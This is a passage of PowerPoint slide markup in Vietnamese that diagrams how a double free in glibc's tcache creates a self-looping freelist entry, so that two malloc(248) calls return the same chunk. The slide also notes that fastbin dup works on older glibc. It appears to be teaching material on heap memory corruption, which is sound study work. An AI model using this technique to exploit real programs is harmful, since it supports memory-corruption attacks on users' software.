          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6903720" y="5646420"/>
            <a:ext cx="4645152" cy="46177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Đều trả về h: nhiều con trỏ hợp lệ cùng trỏ một vùng nhớ</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entries[14] sau từng dòng lệnh</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5.5 · SELF-LOOP TẠO RA UAF</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Shape 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="1417320"/>
            <a:ext cx="8138160" cy="4800600"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1524"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Text 3"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685800" y="1691640"/>
            <a:ext cx="1920240" cy="45720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free(i)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Text 4"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2606040" y="1691640"/>
            <a:ext cx="1280160" cy="45720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entries[14]</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Shape 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3931920" y="1920240"/>
            <a:ext cx="274320" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="22225">
            <a:solidFill>
              <a:schemeClr val="accent1"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
            <a:tailEnd type="triangle"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Text 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4251960" y="1719072"/>
            <a:ext cx="548640" cy="402336"/>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i</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Shape 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4800600" y="1920240"/>
            <a:ext cx="274320" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="22225">
            <a:solidFill>
              <a:schemeClr val="accent1"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
            <a:tailEnd type="triangle"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Text 8"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5120640" y="1691640"/>
            <a:ext cx="548640" cy="45720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NULL</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Text 9"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685800" y="2423160"/>
            <a:ext cx="1920240" cy="45720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free(h)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Text 10"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2606040" y="2423160"/>
            <a:ext cx="1280160" cy="45720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entries[14]</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Shape 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3931920" y="2651760"/>
            <a:ext cx="274320" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="22225">
            <a:solidFill>
              <a:schemeClr val="accent1"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
            <a:tailEnd type="triangle"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Text 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4251960" y="2450592"/>
            <a:ext cx="548640" cy="402336"/>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h</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Shape 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4800600" y="2651760"/>
            <a:ext cx="274320" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="22225">
            <a:solidFill>
              <a:schemeClr val="accent1"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
            <a:tailEnd type="triangle"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Text 14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5120640" y="2450592"/>
            <a:ext cx="548640" cy="402336"/>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i</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Shape 15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5669280" y="2651760"/>
            <a:ext cx="274320" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="22225">
            <a:solidFill>
              <a:schemeClr val="accent1"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
            <a:tailEnd type="triangle"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="Text 16"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5989320" y="2423160"/>
            <a:ext cx="548640" cy="45720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NULL</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Text 17"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6446520" y="2423160"/>
            <a:ext cx="2057400" cy="457200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1100" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>LIFO: h lên đầu</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="20" name="Text 18"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685800" y="3154680"/>
            <a:ext cx="1920240" cy="457200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>malloc(512)→j</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21" name="Text 19"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2606040" y="3154680"/>
            <a:ext cx="1280160" cy="45720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entries[14]</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="22" name="Shape 20"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3931920" y="3383280"/>
            <a:ext cx="274320" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="22225">
            <a:solidFill>
              <a:schemeClr val="accent1"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
            <a:tailEnd type="triangle"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="23" name="Text 21"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4251960" y="3182112"/>
            <a:ext cx="548640" cy="402336"/>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h</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="24" name="Shape 22"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4800600" y="3383280"/>
            <a:ext cx="274320" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="22225">
            <a:solidFill>
              <a:schemeClr val="accent1"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
            <a:tailEnd type="triangle"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="25" name="Text 23"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5120640" y="3182112"/>
            <a:ext cx="548640" cy="402336"/>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i</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="26" name="Shape 24"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5669280" y="3383280"/>
            <a:ext cx="274320" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="22225">
            <a:solidFill>
              <a:schemeClr val="accent1"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
            <a:tailEnd type="triangle"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="27" name="Text 25"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5989320" y="3154680"/>
            <a:ext cx="548640" cy="45720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NULL</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="28" name="Text 26"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6446520" y="3154680"/>
            <a:ext cx="2057400" cy="457200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1100" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>khác size class</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="29" name="Text 27"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685800" y="3886200"/>
            <a:ext cx="1920240" cy="457200"/>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free(h) lần 2</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="30" name="Text 28"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2606040" y="3886200"/>
            <a:ext cx="1280160" cy="45720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entries[14]</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="31" name="Shape 29"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3931920" y="4114800"/>
            <a:ext cx="274320" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="22225">
            <a:solidFill>
              <a:schemeClr val="accent2"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
            <a:tailEnd type="triangle"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="32" name="Text 30"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4251960" y="3913632"/>
            <a:ext cx="548640" cy="402336"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="accent2"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:schemeClr val="accent2"/>
            </a:solidFill>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="762" tIns="762" rIns="762" bIns="762"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h</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="33" name="Text 31"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4846320" y="3886200"/>
            <a:ext cx="960120" cy="457200"/>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 next=h</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="34" name="Text 32"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6446520" y="3886200"/>
            <a:ext cx="2057400" cy="457200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1100" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>h-&gt;next == h; i mất liên kết</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="35" name="Text 33"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685800" y="4617720"/>
            <a:ext cx="1920240" cy="457200"/>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malloc(248)#1</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="36" name="Text 34"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2606040" y="4617720"/>
            <a:ext cx="1280160" cy="45720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entries[14]</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="37" name="Shape 35"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3931920" y="4846320"/>
            <a:ext cx="274320" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="22225">
            <a:solidFill>
              <a:schemeClr val="accent2"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
            <a:tailEnd type="triangle"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="38" name="Text 36"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4251960" y="4645152"/>
            <a:ext cx="548640" cy="402336"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="accent2"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:schemeClr val="accent2"/>
            </a:solidFill>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="762" tIns="762" rIns="762" bIns="762"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h</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="39" name="Text 37"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4846320" y="4617720"/>
            <a:ext cx="960120" cy="457200"/>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 next=h</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="40" name="Text 38"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6446520" y="4617720"/>
            <a:ext cx="2057400" cy="457200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1100" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>trả về h; entries không đổi</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="41" name="Text 39"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685800" y="5349240"/>
            <a:ext cx="1920240" cy="457200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent2"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>malloc(248)#2</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="42" name="Text 40"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2606040" y="5349240"/>
            <a:ext cx="1280160" cy="45720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entries[14]</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="43" name="Shape 41"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3931920" y="5577840"/>
            <a:ext cx="274320" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="22225">
            <a:solidFill>
              <a:schemeClr val="accent2"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
            <a:tailEnd type="triangle"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="44" name="Text 42"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4251960" y="5376672"/>
            <a:ext cx="548640" cy="402336"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="accent2"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:schemeClr val="accent2"/>
            </a:solidFill>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="762" tIns="762" rIns="762" bIns="762"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h</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="45" name="Text 43"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4846320" y="5349240"/>
            <a:ext cx="960120" cy="457200"/>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 next=h</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="46" name="Text 44"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6446520" y="5349240"/>
            <a:ext cx="2057400" cy="457200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1100" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>trả về h lần nữa = UAF</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="47" name="Shape 45"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8823960" y="1417320"/>
            <a:ext cx="2907792" cy="2651760"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2759"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="48" name="Text 46"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9006840" y="1581912"/>
            <a:ext cx="254203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GLIBC ≤ 2.25</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="49" name="Text 47"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9006840" y="1874520"/>
            <a:ext cx="2542032" cy="208483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Chưa có tcache: hai chunk 0x100 vào unsorted bin, hợp nhất với top; free(h) lần 2 đọc metadata rác, thường abort. Muốn minh họa thì dùng fastbin dup, chunk ≤ 0x80.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1250" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="50" name="Shape 48"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8823960" y="4297680"/>
            <a:ext cx="2907792" cy="1920240"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3810"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent2"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="51" name="Text 49"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9006840" y="4462272"/>
            <a:ext cx="2542032" cy="228600"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
